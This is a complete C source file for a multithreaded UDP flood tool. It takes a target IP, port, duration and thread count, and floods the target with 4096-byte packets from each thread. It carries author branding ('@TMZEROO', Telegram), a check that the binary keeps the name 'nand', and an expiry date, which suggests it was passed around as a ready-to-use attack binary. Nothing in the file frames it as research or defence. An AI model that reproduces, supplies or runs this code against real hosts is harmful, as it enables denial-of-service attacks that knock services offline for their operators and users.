#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <unistd.h>

#define EXPIRY_DATE "2024-10-30"
#define PAYLOAD "Hello from @TMZEROO"  // Define your payload here
#define ORIGINAL_BINARY_NAME "nand"     // Expected binary name

void *udp_flood(void *arg);
int is_expired();

struct attack_info {
    char *target_ip;
    int target_port;
    int duration;
};

int main(int argc, char *argv[]) {
    // Check if the binary name is changed
    char *binary_name = strrchr(argv[0], '/');  // Get the name of the binary (after the last '/')
    if (binary_name) {
        binary_name++;  // Skip '/'
    } else {
        binary_name = argv[0];  // If no '/', the whole argv[0] is the binary name
    }

    if (strcmp(binary_name, ORIGINAL_BINARY_NAME) != 0) {
        printf("BSDK ORIGINAL NAM DE 'nand' TABHI CHALEGA\n");
        exit(1);
    }

    if (is_expired()) {
        printf("This binary has expired. Contact @TMZEROO for updates.\n");
        exit(1);
    }

    if (argc != 5) {
        printf("Usage: %s <IP> <Port> <Time> <Threads>\n", argv[0]);
        return -1;
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int time_in_sec = atoi(argv[3]);
    int threads = atoi(argv[4]);

    struct attack_info info;
    info.target_ip = ip;
    info.target_port = port;
    info.duration = time_in_sec;

    pthread_t thread_id[threads];

    for (int i = 0; i < threads; i++) {
        pthread_create(&thread_id[i], NULL, udp_flood, (void *)&info);
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_id[i], NULL);
    }

    printf("BINARY CLOSED BY @TMZEROO From TG\n");

    return 0;
}

void *udp_flood(void *arg) {
    struct attack_info *info = (struct attack_info *)arg;
    char *target_ip = info->target_ip;
    int target_port = info->target_port;
    int duration = info->duration;

    int sock;
    struct sockaddr_in target;
    char packet[4096];  // Buffer for payload

    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_port = htons(target_port);
    target.sin_addr.s_addr = inet_addr(target_ip);

    // Copy the payload into the packet
    strncpy(packet, PAYLOAD, sizeof(packet) - 1);  // Ensure null-termination

    time_t start = time(NULL);

    while (time(NULL) - start < duration) {
        sendto(sock, packet, sizeof(packet), 0, (struct sockaddr *)&target, sizeof(target));
    }

    close(sock);
    pthread_exit(NULL);
}

int is_expired() {
    time_t current_time;
    struct tm expiry_tm = {0};
    time(&current_time);
    
    // Set expiry date as 30 October 2024
    strptime(EXPIRY_DATE, "%Y-%m-%d", &expiry_tm);
    time_t expiry_time = mktime(&expiry_tm);

    return difftime(current_time, expiry_time) > 0 ? 1 : 0;
}
